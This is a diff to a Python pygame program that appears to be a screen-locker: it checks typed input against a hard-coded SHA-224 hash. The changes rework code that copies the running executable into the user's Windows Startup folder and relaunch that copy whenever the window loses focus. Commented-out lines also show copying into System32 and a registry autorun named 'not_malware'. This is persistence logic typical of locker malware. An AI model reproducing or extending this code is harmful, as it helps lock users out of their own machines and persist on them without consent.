@@ -1,5 +1,6 @@
 import hashlib
 import sys
+from shutil import SameFileError
 import pygame
 import os
 import getpass
@@ -62,18 +63,16 @@ def check_input(input_text):
     return sha224.hexdigest() == '9f17cd624f25b28374a58a6c107d3d0df4299ddccfe390eeba373d12'
 
 
-def create_autorun():
+def create_autorun(app_name):
     username = getpass.getuser()
-    filename = 'main.exe'
     dir_name = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
+    # dir2_name = 'C:/Windows/System32/'
     try:
-        shutil.copy(filename, dir_name)
-    except:
-        try:
-            filename = 'dist/' + filename
-            shutil.copy(filename, dir_name)
-        except:
-            pass
+        shutil.copy(app_name, dir_name)
+        # shutil.copy(app_name, dir2_name)
+    except (FileNotFoundError, SameFileError, PermissionError) as e:
+        print(e)
+        return
 
 
 def create_autorun_reg(name):
@@ -83,8 +82,8 @@ def create_autorun_reg(name):
 
 
 def main():
-    app_name = sys.argv[0][sys.argv[0].rfind('/')+1:]
-    create_autorun()
+    app_name = sys.argv[0][sys.argv[0].rfind('\\') + 1:]
+    create_autorun(app_name)
     # create_autorun_reg(app_name[:app_name.find('.')] + 'not_malware')
     pygame.init()
     pygame.font.init()
@@ -106,13 +105,13 @@ def main():
     end = False
     while not end:
         if not pygame.display.get_active() and not flag:
-            print(os.system('.\main.exe'))
+            os.startfile(f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}')
             flag = True
 
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
-                pass
-                # end = True
+                # pass
+                end = True
             if event.type == pygame.KEYDOWN:
                 if event.key == pygame.K_BACKSPACE:
                     input_text = input_text[:-1]
